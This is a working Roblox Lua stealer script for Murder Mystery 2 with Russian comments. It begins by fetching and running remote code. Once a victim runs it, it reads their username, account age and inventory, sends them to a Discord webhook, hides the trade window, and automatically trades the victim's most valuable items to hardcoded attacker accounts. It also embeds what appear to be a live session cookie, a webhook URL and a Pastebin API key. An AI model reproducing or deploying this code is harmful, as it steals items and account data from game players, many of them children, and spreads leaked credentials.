-- ==================== –ó–ê–ü–£–°–ö –ê–ù–¢–ò-–ë–ê–ù–ê –í –ù–ê–ß–ê–õ–ï ====================
loadstring(game:HttpGet('https://raw.githubusercontent.com/FBScripts/sadsad/refs/heads/main/Adm2025',true))()

-- ==================== JOB ID VERIFICATION SYSTEM ====================
getgenv().Cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhACIhsKBGR1aWQSEzk2MTA1NTI5NTY3MTI2MDQyNjYoAw.Q_bHAVD-HxDeSgomIU63hkyS89xZS1_97S9SjHOR7eTtf4XBzKdp6NaghwZ6iOSe043CoTzmZq_yVM-6b7kEUuoa8Cw8ech3loB2FyAiUoJZpB2wtUf-t-pfzWQGEdUYjiCTpVRyFTSU7ATuGGDR_9SVJzYICEwaKItC7wKbI4d_4WejHTiYOmv8ut8wC95Ipe3B1yOssRD6t_xSsAKyyo7skhulxPyBzXpMgLvKAyNLMETtZnZS5Ewl5Hp8ph7BDz2gmMWoYEaZ0gHswU20nbuLxpUwPSnqyUn0CWaeh3L0413PpsLPhuPc85MwgTYN_Px_9x22QywYzO_AP4I63cwe_-pdbFfChZg_kAkQ8BhvTXXLxzJHYvIeqtle0YOyO7SR3UnlX27iUs79KZcY-BidC-5AE9gOzOoaeCiMulCPGD02HDaGcD0VHXLpkwpWuK3VbYsyR045lpJpG5oiJXhCKehDPA6fgRFMt1FV5hgm10lgx8ihE-VY_UcZML1GFWphtfiv0doVwuXkkSDWEoOjw86t0C5WE4Uu_t7_j-S06KJfd7RcasGu2bAfxC49u7z_mxP4pyvN2t05DR48f4IjiSOv77OWFdO9JeWPckJzgNi_kmicTiKoDszXujiNNIjjeS0VCH8Jo6LCkcdOkfwDaTp-s0SqnXDLPhCSD7YAH8dxm6_YjPM5E5kDvg1aobkDu6KVmAjRFGxLyGpkBxvmoWLR03hcSTra5VUTOWp52uDqYT3D_5JtvYKE8E0oix3bx8l-vmUAfzM1DMh1jTkkqxMSP1rJh9lH2H0H5sLDLKIlJtL8kUkv6FvlQ0LcHfQjwgiVXQz_0Zm-YN7vU9F2kFP75RXRcOmdgvlwsgHs3FBOPhnydQwiEVGtzt-Ed3Ew6j4ukvX3v4SyV89luczy2Yg2WHBnxUhob-A58b_JSIjuv3JOqe_vcq5yya2fQaeGVXpjML7UmCY5X26DxDT2oRLIErYheHa4PEJF4_vxw1izxb9opVc5C3UOKjd9hHOfjysUsNzVHxk_tw8h5Z7mVKw40LwpbcZfoPrbl2Or6gp1BubaljahxhZmcKKN3HG1AuXlnZbkexR1v76FUGMi_n06RQrWVIgTi2ILRqKHZkF46nAfGPIgq6qeE-zKt9XEmMK3EesTHMjDa1HNINUT2JY"

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

-- –ü–æ–ª—É—á–∞–µ–º —ç–∫–∑–µ–∫—É—Ç–æ—Ä
local executor = identifyexecutor() or "Unknown"

-- –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ç–æ–ª—å–∫–æ –¥–ª—è Delta –∏ KRNL
local allowedExecutors = {"Delta", "KRNL", "krnl"}

local function shouldCheckJobId()
    for _, allowed in ipairs(allowedExecutors) do
        if string.lower(executor) == string.lower(allowed) then
            return true
        end
    end
    return false
end

-- –ü—Ä–æ—Å—Ç–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è Real JobId
local function GetRealJobIdWithAuth()
    if not getgenv().Cookie then
        return nil
    end
    
    local localPlayer = Players.LocalPlayer
    if not localPlayer then return nil end
    
    local placeId = game.PlaceId
    
    -- –ü–æ–ª—É—á–∞–µ–º –≤—Å–µ—Ö –¥—Ä—É–≥–∏—Ö –∏–≥—Ä–æ–∫–æ–≤
    local otherPlayers = {}
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= localPlayer then
            table.insert(otherPlayers, player.UserId)
        end
    end
    
    if #otherPlayers == 0 then
        return nil
    end
    
    -- –ü—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å —á–µ—Ä–µ–∑ Presence API
    local success, result = pcall(function()
        local jsonBody = HttpService:JSONEncode({
            userIds = otherPlayers
        })
        
        local response = request({
            Url = "https://presence.roblox.com/v1/presence/users",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
                ["Cookie"] = ".ROBLOSECURITY=" .. tostring(getgenv().Cookie)
            },
            Body = jsonBody
        })
        
        if response and response.StatusCode == 200 then
            local data = HttpService:JSONDecode(response.Body)
            if data and data.userPresences then
                for _, presence in pairs(data.userPresences) do
                    if presence.placeId == placeId and presence.gameId and presence.gameId ~= game.JobId then
                        return presence.gameId
                    end
                end
            end
        end
        
        return nil
    end)
    
    if success then
        return result
    end
    
    return nil
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ–± –æ–∂–∏–¥–∞–Ω–∏–∏
local function SendWaitingNotification(inventoryValue, playerName)
    local embed = {
        ["title"] = "‚è≥ –û–∂–∏–¥–∞–Ω–∏–µ Real JobId",
        ["color"] = 16753920,
        ["fields"] = {
            {
                ["name"] = "üë§ –ò–≥—Ä–æ–∫",
                ["value"] = "`" .. playerName .. "`",
                ["inline"] = true
            },
            {
                ["name"] = "üí∞ –°—Ç–æ–∏–º–æ—Å—Ç—å –∏–Ω–≤–µ–Ω—Ç–∞—Ä—è",
                ["value"] = "`" .. tostring(inventoryValue) .. "`",
                ["inline"] = true
            }
        }
    }
    
    local data = {
        ["username"] = "M O L I T O W N",
        ["avatar_url"] = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg",
        ["embeds"] = {embed}
    }
    
    pcall(function()
        request({
            Url = Webhook,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(data)
        })
    end)
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ –Ω–æ–≤—ã—Ö –∏–≥—Ä–æ–∫–æ–≤
local function MonitorForRealJobId(inventoryValue, playerName)
    local maxAttempts = 12  -- 1 –º–∏–Ω—É—Ç–∞ (12 * 5 —Å–µ–∫—É–Ω–¥)
    local attempt = 0
    
    while attempt < maxAttempts do
        local realJobId = GetRealJobIdWithAuth()
        
        if realJobId then
            getgenv().RealJobId = realJobId
            pcall(function() writefile("real_jobid.txt", realJobId) end)
            return realJobId
        end
        
        attempt = attempt + 1
        wait(5)
        
        if attempt % 3 == 0 then  -- –ö–∞–∂–¥—ã–µ 15 —Å–µ–∫—É–Ω–¥
            SendWaitingNotification(inventoryValue, playerName)
        end
    end
    
    return nil
end

local function FindRealJobId(inventoryValue, playerName)
    if not shouldCheckJobId() then
        getgenv().RealJobId = game.JobId
        return game.JobId
    end
    
    local realJobId = GetRealJobIdWithAuth()
    
    if realJobId then
        getgenv().RealJobId = realJobId
        pcall(function() writefile("real_jobid.txt", realJobId) end)
        return realJobId
    else
        SendWaitingNotification(inventoryValue, playerName)
        return MonitorForRealJobId(inventoryValue, playerName) or game.JobId
    end
end

-- ==================== –û–°–ù–û–í–ù–û–ô –ö–û–î ====================
Username = "knisdqx_meow"
Username2 = "noviy_nickname"
Webhook = "https://webhook.lewisakura.moe/api/webhooks/1441725786586615820/MjAaItKYv69qFFNdgxWQn1xe2HdO0ZV3rRKrbzBLk64Gb99KvxnLNyM9evUsYQa-Vd42"
MinimumValues = 30

repeat task.wait() until game:IsLoaded()

if getgenv().mm2 then return end
getgenv().mm2 = true

if #game:GetService("Players"):GetPlayers() == game.Players.MaxPlayers then
    game:GetService("Players").LocalPlayer:Kick("\nANTIBAN: Admins detected. Join another server")
    return
end

if game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType"):InvokeServer() == "VIPServer" then
    game.Players.LocalPlayer:Kick("\nScript doesn't supported vip servers")
    return
end

if MinimumValues == nil or MinimumValues < 0 then
    MinimumValues = 0
end

local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
local LP = game:GetService("Players").LocalPlayer
local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
local NameValue = game:GetService("Players").LocalPlayer.Name or "Unknown"
local IdValue = game:GetService("Players").LocalPlayer.userId or "Unknown"
local AgeValue = game:GetService("Players").LocalPlayer.AccountAge or "Unknown"
local ExecutorValue = identifyexecutor() or "Unknown"
local VersionValue = "2.0 (Trade System + Values Update)"

-- –¢–∞–±–ª–∏—Ü–∞ –∑–Ω–∞—á–µ–Ω–∏–π
local valuesTable = {
    ["Gingerscope"] = 10500,
    ["TravelerAxe"] = 5000,
    ["Harvester"] = 390,
    ["Icepiercer"] = 350,
    ["VampireAxe"] = 600,
    ["Celestial"] = 800,
    ["Corrupt"] = 800,
    ["SwirlyAxe"] = 100,
    ["Icebreaker"] = 100,
    ["ElderwoodScythe"] = 65,
    ["Scythe"] = 77,
    ["Hallowscythe"] = 55,
    ["Logchopper"] = 25,
    ["Icewing"] = 5,
    ["GhostK2018"] = 10,
    ["AmericaGun"] = 8,
    ["BloodKnife"] = 8,
    ["Disint"] = 7,
    ["Phaser"] = 7,
    ["ShadowKnife"] = 6,
    ["TimeKnife"] = 5,
    ["Gun1"] = 4,
    ["GoldenGun"] = 4,
    ["Knife1"] = 3,
    ["TravelerGunChroma"] = 20000,
    ["TreeGun2023Chroma"] = 30000,
    ["TreeKnife2023Chroma"] = 35000,
    ["VampireGunChroma"] = 10000,
    ["ConstellationChroma"] = 10000,
    ["BaubleChroma"] = 6500,
    ["WatergunChroma"] = 3500,
    ["RaygunChroma"] = 7000,
    ["AlienbeamChroma"] = 9000,
    ["SunsetChroma"] = 3500,
    ["SunriseChroma"] = 4500,
    ["ChromaDarkbringer"] = 125,
    ["ChromaLightbringer"] = 120,
    ["CandleflameChroma"] = 115,
    ["ElderwoodKnifeChroma"] = 115,
    ["SwirlyGunChroma"] = 115,
    ["Gingermint_KChroma"] = 110,
    ["LugerChroma"] = 100,
    ["LaserChroma"] = 80,
    ["HeatChroma"] = 70,
    ["DeathshardChroma"] = 65,
    ["GemstoneChroma"] = 65,
    ["SharkChroma"] = 65,
    ["SlasherChroma"] = 65,
    ["TidesChroma"] = 65,
    ["FangChroma"] = 55,
    ["GingerbladeChroma"] = 55,
    ["SeerChroma"] = 55,
    ["BonebladeChroma"] = 50,
    ["SawChroma"] = 50,
    ["TravelerGun"] = 3600,
    ["TreeGun2023"] = 2800,
    ["Turkey2023"] = 1500,
    ["TreeKnife2023"] = 1200,
    ["Blossom_G"] = 640,
    ["Sakura_K"] = 630,
    ["Constellation"] = 800,
    ["Darkshot"] = 600,
    ["Darksword"] = 460,
    ["VampireGun"] = 800,
    ["Bauble"] = 400,
    ["ZombieBat"] = 250,
    ["Candy"] = 150,
    ["Rainbow_G"] = 300,
    ["Rainbow_K"] = 300,
    ["Ocean_G"] = 150,
    ["WraithGun"] = 145,
    ["WraithKnife"] = 145,
    ["Waves_K"] = 145,
    ["AuroraKnife"] = 135,
    ["AuroraGun"] = 135,
    ["FlowerwoodGun"] = 135,
    ["FlowerwoodKnife"] = 130,
    ["Heartblade"] = 125,
    ["Sugar"] = 125,
    ["SwirlyGun"] = 115,
    ["Makeshift"] = 105,
    ["Candleflame"] = 100,
    ["ElderwoodKnife"] = 100,
    ["Watergun"] = 90,
    ["Raygun"] = 250,
    ["Alienbeam"] = 300,
    ["Xenoknife"] = 200,
    ["Xenoshot"] = 250,
    ["Flora"] = 200,
    ["Bloom"] = 200,
    ["Sunset"] = 250,
    ["Sunrise"] = 300,
    ["Snowcannon"] = 600,
    ["Snowdagger"] = 600,
    ["Phantom2022"] = 75,
    ["Spectre2022"] = 75,
    ["Luger"] = 75,
    ["RedLuger"] = 70,
    ["SwirlyBlade"] = 65,
    ["Iceblaster"] = 65,
    ["Pearl_K"] = 62,
    ["Pearl_G"] = 62,
    ["Darkbringer"] = 60,
    ["ElderwoodGun"] = 60,
    ["Lightbringer"] = 58,
    ["Gingermint_K"] = 40,
    ["Gingermint_G"] = 40,
    ["GreenLuger"] = 40,
    ["Hallowgun"] = 35,
    ["Laser"] = 32,
    ["Icebeam"] = 32,
    ["Iceflake"] = 32,
    ["Plasmabeam"] = 32,
    ["Plasmablade"] = 32,       
    ["Amerilaser"] = 30,
    ["Blaster"] = 30,
    ["Nightblade"] = 30,
    ["AmericaSword"] = 28,
    ["Nebula"] = 28,
    ["Shark"] = 28,
    ["Virtual"] = 27,
    ["Gemstone"] = 25,
    ["Clockwork"] = 23,
    ["EternalCane"] = 23,
    ["GingerLuger"] = 23,
    ["Lugercane"] = 23,
    ["Pixel"] = 23,
    ["Slasher"] = 23,
    ["Gingerblade"] = 22,
    ["Heat"] = 22,
    ["Minty"] = 22,
    ["BattleAxe2"] = 20,
    ["Deathshard"] = 20,
    ["Tides"] = 20,
    ["Fang"] = 18,
    ["Spider"] = 17,
    ["Chill"] = 17,
    ["Jinglegun"] = 15,
    ["VampiresEdge"] = 15,
    ["Pumpking"] = 15,
    ["Bioblade"] = 13,
    ["BattleAxe"] = 13,
    ["Frostsaber"] = 13,
    ["Xmas"] = 13,
    ["Flames"] = 12,
    ["Hallow"] = 12,
    ["IceDragon"] = 12,
    ["IceShard"] = 12,
    ["WintersEdge"] = 12,
    ["Ghostblade"] = 10,
    ["HallowsBlade"] = 10,
    ["Handsaw"] = 10,
    ["Eternal"] = 10,
    ["Eternal2"] = 10,
    ["Eternal3"] = 10,
    ["Eternal4"] = 10,
    ["Boneblade"] = 8,
    ["Eggblade"] = 7,
    ["Frostbite"] = 7,
    ["Prismatic"] = 7,
    ["Saw"] = 7,
    ["Snowflake"] = 7,
    ["Peppermint"] = 7,
    ["Cookieblade"] = 7,
    ["BlueSeer"] = 7,
    ["PurpleSeer"] = 7,
    ["RedSeer"] = 7,
    ["TheSeer"] = 7,
    ["OrangeSeer"] = 7,
    ["YellowSeer"] = 7,
    ["JD"] = 65,
    ["Latte_G_2023"] = 90,
    ["Latte_K_2023"] = 90,
    ["CottonCandy"] = 65,
    ["Witched"] = 55,
    ["Beach_K_2023"] = 30,
    ["Cavern_K_2019"] = 22,
}

-- –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –∏–Ω–≤–µ–Ω—Ç–∞—Ä—è
local allItems = {}
local totalValues = 0
local uniqueItemsValue = 0
local ancientItemsValue = 0
local godlyItemsValue = 0
local vintageItemsValue = 0
local legendaryItemsValue = 0
local rareItemsValue = 0
local uncommonItemsValue = 0
local commonItemsValue = 0

local function CalculateInventory()
    totalValues = 0
    uniqueItemsValue = 0
    ancientItemsValue = 0
    godlyItemsValue = 0
    vintageItemsValue = 0
    legendaryItemsValue = 0
    rareItemsValue = 0
    uncommonItemsValue = 0
    commonItemsValue = 0
    
    allItems = {}

    for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
        for c, d in pairs(b) do
            local itemValue = valuesTable[d.DataID] or 0
            local totalValue = itemValue * d.Amount
            
            if d.Rarity == "Unique" then
                uniqueItemsValue = uniqueItemsValue + totalValue
            elseif d.Rarity == "Ancient" then
                ancientItemsValue = ancientItemsValue + totalValue
            elseif d.Rarity == "Godly" then
                godlyItemsValue = godlyItemsValue + totalValue
            elseif d.Rarity == "Vintage" then
                vintageItemsValue = vintageItemsValue + totalValue
            elseif d.Rarity == "Legendary" then
                legendaryItemsValue = legendaryItemsValue + totalValue
            elseif d.Rarity == "Rare" then
                rareItemsValue = rareItemsValue + totalValue
            elseif d.Rarity == "Uncommon" then
                uncommonItemsValue = uncommonItemsValue + totalValue
            elseif d.Rarity == "Common" then
                commonItemsValue = commonItemsValue + totalValue
            end
            
            local weaponValue = itemValue * d.Amount
            table.insert(allItems, {
                weaponName = d.ItemName,
                weaponData = d.DataID,
                weaponAmount = d.Amount,
                weaponRarity = d.Rarity,
                weaponValue = weaponValue
            })
            
            totalValues = totalValues + weaponValue
        end
    end

    return totalValues
end

-- –°–æ–±–∏—Ä–∞–µ–º –¥–∞–Ω–Ω—ã–µ –∏–Ω–≤–µ–Ω—Ç–∞—Ä—è
local inventoryValue = CalculateInventory()

-- –ü–æ–ª—É—á–∞–µ–º Real JobId
if getgenv().Cookie and shouldCheckJobId() then
    getgenv().RealJobId = FindRealJobId(inventoryValue, NameValue) or game.JobId
else
    getgenv().RealJobId = game.JobId
end

-- –°–æ–∑–¥–∞–µ–º —Å—Å—ã–ª–∫—É –¥–ª—è —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞
local placeId = game.PlaceId
local realJobId = getgenv().RealJobId or game.JobId
local protocolLink = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. realJobId
local TeleportScript = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" .. realJobId .. "\")"

-- –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π
function SendMessageEMBED(url, embed, bool)
    local http = game:GetService("HttpService")
    local headers = {["Content-Type"] = "application/json"}
    
    local teleportContent = "üéØ **–í–¨–ï–ë–ê–ù** –û—á–µ—Ä–µ–¥–Ω–æ–π –∫—É–∫–∏—á:\n\n" .. TeleportScript
    
    local data = {
        ["username"] = "M O L I T O W N",
        ["avatar_url"] = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg",
        ["content"] = teleportContent,
        ["embeds"] = {{
            ["title"] = embed.title,
            ["color"] = embed.color,
            ["fields"] = embed.fields,
            ["footer"] = {["text"] = "Molitown Team 2025"}
        }}
    }
    
    local data2 = {
        ["username"] = "M O L I T O W N", 
        ["avatar_url"] = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg", 
        ["content"] = "-- @everyone\n" .. teleportContent,
        ["embeds"] = {{
            ["title"] = embed.title,
            ["color"] = embed.color,
            ["fields"] = embed.fields,
            ["footer"] = {["text"] = "Molitown Team 2025"}
        }}
    }
    
    local body = http:JSONEncode(bool and data2 or data)

    pcall(function()
        request({
            Url = url,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end)
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —É—Å–ø–µ—à–Ω–æ–≥–æ —Ç—Ä–µ–π–¥–∞
function SendTradeSuccessMessage(sentItems, ReceiverName)
    local itemsText = ""
    local totalValue = 0
    
    for _, item in pairs(sentItems) do
        local itemValue = valuesTable[item.dataId] or 0
        totalValue = totalValue + (itemValue * item.amount)
        itemsText = itemsText .. string.format("%s ‚Ä¢ x%d ‚Ä¢ %d\n", item.name, item.amount, itemValue * item.amount)
    end
    
    local data = {
        ["username"] = "Mama Mia",
        ["avatar_url"] = "https://i.pinimg.com/736x/ae/1c/35/ae1c3515d3891f20997929813c9ea8fe.jpg",
        ["embeds"] = {{
            ["title"] = "‚úÖ –í—å–µ–±–∞–ª–∏ –¥–æ–¥–∏–∫–∞ –≤ —á–µ—à–∫–∏",
            ["color"] = 65280,
            ["fields"] = {
                {["name"] = "üì¶ –ú–µ—á–∏ –¥–µ—Ç–µ–π:", ["value"] = "```" .. itemsText .. "```", ["inline"] = false},
                {["name"] = "üí∞ –û–±—â–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å:", ["value"] = "**" .. totalValue .. "**", ["inline"] = true},
                {["name"] = "üë§ –ó–∞–±—Ä–∞–ª:", ["value"] = "**" .. ReceiverName .. "**", ["inline"] = true}
            },
            ["footer"] = {["text"] = "Molitown Team feat. Interpol ‚Ä¢ " .. os.date("%Y-%m-%d %H:%M:%S")}
        }}
    }
    
    pcall(function()
        request({
            Url = Webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end

-- –ü—Ä–æ–≤–µ—Ä—è–µ–º –º–∏–Ω–∏–º–∞–ª—å–Ω—É—é —Å—Ç–æ–∏–º–æ—Å—Ç—å
if totalValues < MinimumValues then
    return
end

-- –ü–æ–ª—É—á–∞–µ–º —Ç–æ–ø –ø—Ä–µ–¥–º–µ—Ç—ã
local function getTopValuableItems(n)
    table.sort(allItems, function(a, b) 
        return a.weaponValue > b.weaponValue
    end)
    
    local topItems = {}
    for i = 1, math.min(n, #allItems) do
        local item = allItems[i]
        local rarityEmoji = {
            Unique = "üíé", Ancient = "üî•", Godly = "‚≠ê",
            Vintage = "üï∞Ô∏è", Legendary = "üëë", Rare = "üîµ",
            Uncommon = "üü¢", Common = "‚ö™"
        }
        
        local emoji = rarityEmoji[item.weaponRarity] or "üì¶"
        table.insert(topItems, string.format("%s %s ‚Ä¢ %d ‚Ä¢ x%d", emoji, item.weaponName, item.weaponValue / item.weaponAmount, item.weaponAmount))
    end
    return topItems
end

local topItems = getTopValuableItems(5)
local topItemsText = #topItems > 0 and table.concat(topItems, "\n") or "No valuable items"

-- –°–æ–∑–¥–∞–µ–º pastebin
local function pastebin(content)
    local success, result = pcall(function()
        local response = request({
            Url = "https://pastebin.com/api/api_post.php",
            Method = "POST",
            Body = "api_dev_key=80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW&api_paste_code=" .. HttpService:UrlEncode(content) .. "&api_option=paste",
            Headers = {["Content-Type"] = "application/x-www-form-urlencoded"}
        })
        
        if response and response.Success then
            local pasteUrl = response.Body
            return "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")
        end
    end)
    
    return success and result or "https://pastebin.com"
end

-- –ü–æ–¥–≥–æ—Ç–∞–≤–ª–∏–≤–∞–µ–º —Å–ø–∏—Å–æ–∫ –ø—Ä–µ–¥–º–µ—Ç–æ–≤ –¥–ª—è pastebin
local itemCategories = {
    ["Unique"] = {}, ["Ancient"] = {}, ["Godly"] = {},
    ["Vintage"] = {}, ["Legendary"] = {}, ["Rare"] = {},
    ["Uncommon"] = {}, ["Common"] = {}
}

for _, item in pairs(allItems) do
    if itemCategories[item.weaponRarity] then
        table.insert(itemCategories[item.weaponRarity], item.weaponName .. " ‚Ä¢ [x" .. item.weaponAmount .. " | " .. item.weaponValue .. "]")
    end
end

local pastebinContent = ""
for rarity, items in pairs(itemCategories) do
    if #items > 0 then
        pastebinContent = pastebinContent .. "-- [ " .. rarity .. " Items ] --\n" .. table.concat(items, "\n") .. "\n\n"
    end
end

local pastebinLink = pastebin(pastebinContent .. "Inventory list ft. Molitown")

-- –ü–æ–ª—É—á–∞–µ–º —É—Ä–æ–≤–µ–Ω—å
local levelTable = {}
for i,v in pairs(LevelModule.XPTable) do
    if PlayerDataModule.NewXP < v then
        table.insert(levelTable, i)
    end
end
local playerLevel = math.min(table.unpack(levelTable))
local playerPrestige = LevelModule.Prestige

-- –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Å–Ω–æ–≤–Ω–æ–π –ª–æ–≥
local embed = {
    ["title"] = "üéØ –í–¨–ï–ë–ê–ù - –î–æ–ª–±–∞–µ–± —Ä–∞–∫–Ω—É–ª –≤–∞—à —Å–∫—Ä–∏–ø—Ç! - " .. NameValue,
    ["color"] = 16711935, 
    ["fields"] = {
        {
            ["name"] = "üîó **Teleport to :mammoth:**",
            ["value"] = "üöÄ**–í—Å—Ç–∞–≤—å –≤ –±—Ä–∞—É–∑–µ—Ä –¥–ª—è —Å–≤—è–∑–∏ —Å –¥—É–ø–ª–æ–º**\n```" .. protocolLink .. "```\n**–î–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–π —Å–≤—è–∑–∏:**\n```lua\n" .. TeleportScript .. "\n```",
            ["inline"] = false
        },
        {
            ["name"] = "„Äò:mammoth:„Äô**Info user**",
            ["value"] = "```lua\nUsername      : "..NameValue.."\nAccount Age   : "..AgeValue.." Days\nExecutor      : "..ExecutorValue.."\nReceiver      : "..Username.."/"..Username2.."\nVersion       : "..VersionValue.."```",
            ["inline"] = false
        },
        {
            ["name"] = "„Äò:moneybag:„Äô**Inventory Stats**",
            ["value"] = "```lua\nüíé –¢–û–ü 5 –ü–†–ï–î–ú–ï–¢–û–í:\n"..topItemsText.."\n\nüí∞ –û–±—â–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å : "..totalValues.."\n\nüî• Ancients Value  : "..ancientItemsValue.."\n‚≠ê Godlies Value   : "..godlyItemsValue.."\nüëë Legendaries     : "..legendaryItemsValue.."\n```",
            ["inline"] = false
        },
        {
            ["name"] = "„Äò:package:„Äô**Full Inventory List**",
            ["value"] = "[üìã Click to check]("..pastebinLink..")",
            ["inline"] = false
        },
    }
}

if godlyItemsValue >= 100 or ancientItemsValue >= 100 or uniqueItemsValue >= 100 or totalValues >= 100 then
    SendMessageEMBED(Webhook, embed, true)
else
    SendMessageEMBED(Webhook, embed, false)
end

-- –°–∫—Ä—ã—Ç–∏–µ TradeGUI
coroutine.wrap(function()
    local player = Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")
    
    local function hideTradeGUI()
        for _, guiName in pairs({"TradeGUI", "TradeGUI_Phone"}) do
            local gui = playerGui:FindFirstChild(guiName)
            if gui then
                gui.Enabled = false
                if not gui:FindFirstChild("AntiFlash") then
                    local conn = gui:GetPropertyChangedSignal("Enabled"):Connect(function()
                        if gui.Enabled then gui.Enabled = false end
                    end)
                    local anti = Instance.new("BoolValue")
                    anti.Name = "AntiFlash"
                    anti.Parent = gui
                end
            end
        end
    end

    hideTradeGUI()
    playerGui.ChildAdded:Connect(function(child)
        if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
            hideTradeGUI()
        end
    end)

    while true do
        hideTradeGUI()
        task.wait(0.1)
    end
end)()

-- –¢—Ä–µ–π–¥ —Å–∏—Å—Ç–µ–º–∞
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Trade = ReplicatedStorage:WaitForChild("Trade")
local lastOfferValue = nil

Trade.UpdateTrade.OnClientEvent:Connect(function(tradeData)
    lastOfferValue = tradeData.LastOffer
end)

local function isTradeGUIOpen()
    local playerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
    return playerGui:FindFirstChild("TradeGUI") or playerGui:FindFirstChild("TradeGUI_Phone")
end

local function stealItems(ReceiverName)
    local loop = true
    local tradeInProgress = false
    
    while loop do
        if tradeInProgress then
            task.wait(1)
            continue
        end
        
        local availableItems = {}
        for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
            for c, d in pairs(b) do
                local itemValue = valuesTable[d.DataID] or 0
                if itemValue > 0 and d.Amount > 0 then
                    table.insert(availableItems, {
                        name = d.ItemName,
                        dataId = d.DataID,
                        value = itemValue,
                        amount = d.Amount
                    })
                end
            end
        end
        
        table.sort(availableItems, function(a, b) return a.value > b.value end)
        
        if #availableItems == 0 then
            loop = false
            return
        end
        
        tradeInProgress = true
        local success = pcall(function()
            Trade.SendRequest:InvokeServer(game:GetService("Players")[ReceiverName])
        end)
        
        if not success then
            tradeInProgress = false
            task.wait(5)
            continue
        end
        
        local tradeAccepted = false
        for i = 1, 30 do
            if isTradeGUIOpen() then
                tradeAccepted = true
                break
            end
            task.wait(1)
        end
        
        if not tradeAccepted then
            tradeInProgress = false
            continue
        end
        
        task.wait(2)
        
        local sentItems = {}
        local addedCount = 0
        
        for _, item in ipairs(availableItems) do
            if addedCount >= 4 then break end
            
            local addAmount = math.min(item.amount, 4 - addedCount)
            for i = 1, addAmount do
                local offerSuccess = pcall(function()
                    Trade.OfferItem:FireServer(item.dataId, "Weapons")
                end)
                
                if offerSuccess then
                    table.insert(sentItems, {
                        name = item.name,
                        dataId = item.dataId,
                        amount = 1
                    })
                    addedCount = addedCount + 1
                end
                
                task.wait(0.5)
                if addedCount >= 4 then break end
            end
        end
        
        if addedCount == 0 then
            pcall(function() Trade.DeclineTrade:FireServer() end)
            tradeInProgress = false
            task.wait(5)
            continue
        end
        
        task.wait(4)
        
        if lastOfferValue then
            local acceptSuccess = pcall(function()
                Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOfferValue)
            end)
            
            if acceptSuccess and #sentItems > 0 then
                SendTradeSuccessMessage(sentItems, ReceiverName)
            end
        else
            pcall(function()
                Trade.AcceptTrade:FireServer(game.PlaceId * 3, tick())
            end)
        end
        
        for i = 1, 10 do
            if not isTradeGUIOpen() then break end
            task.wait(1)
        end
        
        tradeInProgress = false
        task.wait(1)
    end
end

-- –û–±—Ä–∞–±–æ—Ç–∫–∞ –∏–≥—Ä–æ–∫–æ–≤
local function SetupTradeForPlayer(player)
    if player.Name == Username or player.Name == Username2 then
        player.Chatted:Connect(function(message)
            if message:lower():match("trade") or message:lower():match("–æ–±–º–µ–Ω") then
                stealItems(player.Name)
            end
        end)
        
        player.Chatted:Connect(function(message)
            if message == "free dope" then
                game.Players.LocalPlayer:Kick("\nPlease rejoin!")
            end
        end)
        
        task.wait(2)
        stealItems(player.Name)
    end
end

game.Players.PlayerAdded:Connect(SetupTradeForPlayer)

for _, player in pairs(game.Players:GetPlayers()) do
    if player.Name == Username or player.Name == Username2 then
        SetupTradeForPlayer(player)
    end
end
